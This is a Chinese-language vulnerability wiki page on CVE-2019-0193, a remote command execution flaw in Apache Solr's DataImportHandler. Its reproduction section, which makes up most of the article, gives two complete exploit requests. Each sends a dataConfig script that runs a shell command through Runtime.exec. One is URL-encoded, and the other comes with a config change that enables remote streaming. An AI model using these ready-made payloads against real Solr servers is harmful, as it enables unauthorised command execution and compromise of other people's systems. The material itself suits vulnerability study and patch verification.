<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache%20Solr/%EF%BC%88CVE-2019-0193%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-0193）Apache Solr 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-0193\uff09Apache Solr \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-12409）Apache Solr JMX 远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-0193apache-solr">（CVE-2019-0193）Apache Solr 远程命令执行漏洞<a class="headerlink" href="#cve-2019-0193apache-solr" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于
HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache
Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Apache Solr \&lt; 8.2.0</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="poc">poc 一 ：需要目标出网，支持低版本检测<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>判断该索引库是否使用了DataImportHandler模块</p>
</blockquote>
<ul>
<li>
<p>访问
    <code>http://www.0-sec.org:8983/solr/test_0nth3way/admin/mbeans?cat=QUERY&amp;wt=json</code></p>
</li>
<li>
<p>如果使用了<code>DataImportHandler</code>模块
    则HTTP响应内会有:<code>org.apache.solr.handler.dataimport.DataImportHandler</code></p>
</li>
</ul>
<p>1.png</p>
<ul>
<li>构造HTTP请求，远程执行代码</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    POST /solr/test_0nth3way/dataimport HTTP/1.1
    Host: <a href="http://www.0-sec.org:8983">www.0-sec.org:8983</a>
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
    Accept: application/json, text/plain, <em>/</em>
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: <a href="http://192.168.17.136:8983/solr/">http://192.168.17.136:8983/solr/</a>
    Content-type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Content-Length: 1231
    Connection: close</p>
<div class="codehilite"><pre><span></span><code>command=full-import<span class="err">&amp;</span>verbose=false<span class="err">&amp;</span>clean=false<span class="err">&amp;</span>commit=false<span class="err">&amp;</span>debug=true<span class="err">&amp;</span>core=test_0nth3way<span class="err">&amp;</span>name=dataimport<span class="err">&amp;</span>dataConfig=
<span class="nt">&lt;dataConfig&gt;</span>


<span class="w">  </span><span class="nt">&lt;dataSource</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;URLDataSource&quot;</span><span class="nt">/&gt;</span>
<span class="w">  </span><span class="nt">&lt;script&gt;</span><span class="cp">&lt;![CDATA[</span>

<span class="cp">          function poc(row){</span>

<span class="cp"> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()));</span>

<span class="cp">var result = [];</span>

<span class="cp">while(true) {</span>
<span class="cp">var oneline = bufReader.readLine();</span>
<span class="cp">result.push( oneline );</span>
<span class="cp">if(!oneline) break;</span>
<span class="cp">}</span>

<span class="cp">row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));</span>

<span class="cp">return row;</span>

<span class="cp">}</span>


<span class="cp">  ]]&gt;</span><span class="nt">&lt;/script&gt;</span>

<span class="w">        </span><span class="nt">&lt;document&gt;</span>
<span class="w">             </span><span class="nt">&lt;entity</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;entity1&quot;</span>
<span class="w">                     </span><span class="na">url=</span><span class="s">&quot;https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml&quot;</span>
<span class="w">                     </span><span class="na">processor=</span><span class="s">&quot;XPathEntityProcessor&quot;</span>
<span class="w">                     </span><span class="na">forEach=</span><span class="s">&quot;/RDF/item&quot;</span>
<span class="w">                     </span><span class="na">transformer=</span><span class="s">&quot;script:poc&quot;</span><span class="nt">&gt;</span>
<span class="w">                        </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">column=</span><span class="s">&quot;title&quot;</span><span class="w"> </span><span class="na">xpath=</span><span class="s">&quot;/RDF/item/title&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">             </span><span class="nt">&lt;/entity&gt;</span>
<span class="w">        </span><span class="nt">&lt;/document&gt;</span>
<span class="nt">&lt;/dataConfig&gt;</span>
</code></pre></div>

<blockquote>
<p>demo.xml</p>
<p>若如上github因不可抗因素失效，可自行用自己vps搭建demo.xml</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;RDF&gt;</span>
<span class="nt">&lt;item/&gt;</span>
<span class="nt">&lt;/RDF&gt;</span>
</code></pre></div>

<p>2.png</p>
<h3 id="poc_1">poc 二 ：不需要目标出网，不支持低版本检测<a class="headerlink" href="#poc_1" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>判断该索引库是否使用了<code>DataImportHandler</code>模块（同上）</p>
</li>
<li>
<p>修改<code>configoverlay.json</code>文件中的配置，以启用远程流的相关选项
    （enableStreamBody、enableRemoteStreaming）
    注：某些低版本会不成功，即响应500；成功响应200</p>
</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    POST /solr/test_0nth3way/config HTTP/1.1
    Host: <a href="http://www.0-sec.org:8983">www.0-sec.org:8983</a>
    Accept: <em>/</em>
    Content-type:application/json
    Content-Length: 159
    Connection: close</p>
<div class="codehilite"><pre><span></span><code>{&quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;: true}, &quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableStreamBody&quot;: true}}
</code></pre></div>

<ul>
<li>构造HTTP请求，远程执行代码</li>
</ul>
<p><div class="highlight"><pre><span></span><code>&lt;!-- --&gt;
</code></pre></div>
    POST /solr/test_0nth3way/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test_0nth3way&amp;name=dataimport&amp;dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%64%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e HTTP/1.1
    Host: <a href="http://www.0-sec.org:8983">www.0-sec.org:8983</a>
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
    Accept: application/json, text/plain, <em>/</em>
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Referer: <a href="http://192.168.17.136:8983/solr/">http://192.168.17.136:8983/solr/</a>
    Content-Length: 212
    content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f</p>
<div class="codehilite"><pre><span></span><code>--------------------------aceb88c2159f183f
Content-Disposition:<span class="w"> </span>form-data;<span class="w"> </span>name=&quot;stream.body&quot;

<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="nt">&lt;RDF&gt;</span>
<span class="nt">&lt;item/&gt;</span>
<span class="nt">&lt;/RDF&gt;</span>

--------------------------aceb88c2159f183f--
</code></pre></div>

<blockquote>
<p>注：其中dataConfig的值，URLencode之前为以下字符串</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;dataConfig&gt;</span>
<span class="nt">&lt;dataSource</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;streamsrc&quot;</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;ContentStreamDataSource&quot;</span><span class="w"> </span><span class="na">loggerLevel=</span><span class="s">&quot;TRACE&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>

<span class="w">  </span><span class="nt">&lt;script&gt;</span><span class="cp">&lt;![CDATA[</span>
<span class="cp">          function poc(row){</span>
<span class="cp"> var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()));</span>

<span class="cp">var result = [];</span>

<span class="cp">while(true) {</span>
<span class="cp">var oneline = bufReader.readLine();</span>
<span class="cp">result.push( oneline );</span>
<span class="cp">if(!oneline) break;</span>
<span class="cp">}</span>

<span class="cp">row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));</span>
<span class="cp">return row;</span>

<span class="cp">}</span>

<span class="cp">]]&gt;</span><span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;document&gt;</span>
<span class="w">    </span><span class="nt">&lt;entity</span>
<span class="w">        </span><span class="na">stream=</span><span class="s">&quot;true&quot;</span>
<span class="w">        </span><span class="na">name=</span><span class="s">&quot;entity1&quot;</span>
<span class="w">        </span><span class="na">datasource=</span><span class="s">&quot;streamsrc1&quot;</span>
<span class="w">        </span><span class="na">processor=</span><span class="s">&quot;XPathEntityProcessor&quot;</span>
<span class="w">        </span><span class="na">rootEntity=</span><span class="s">&quot;true&quot;</span>
<span class="w">        </span><span class="na">forEach=</span><span class="s">&quot;/RDF/item&quot;</span>
<span class="w">        </span><span class="na">transformer=</span><span class="s">&quot;script:poc&quot;</span><span class="nt">&gt;</span>
<span class="w">             </span><span class="nt">&lt;field</span><span class="w"> </span><span class="na">column=</span><span class="s">&quot;title&quot;</span><span class="w"> </span><span class="na">xpath=</span><span class="s">&quot;/RDF/item/title&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
<span class="w">    </span><span class="nt">&lt;/entity&gt;</span>
<span class="nt">&lt;/document&gt;</span>
<span class="nt">&lt;/dataConfig&gt;</span>
</code></pre></div>

<p>3.png</p>
<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://www.cnblogs.com/0nth3way/p/11908763.html">https://www.cnblogs.com/0nth3way/p/11908763.html</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-12409）Apache Solr JMX 远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>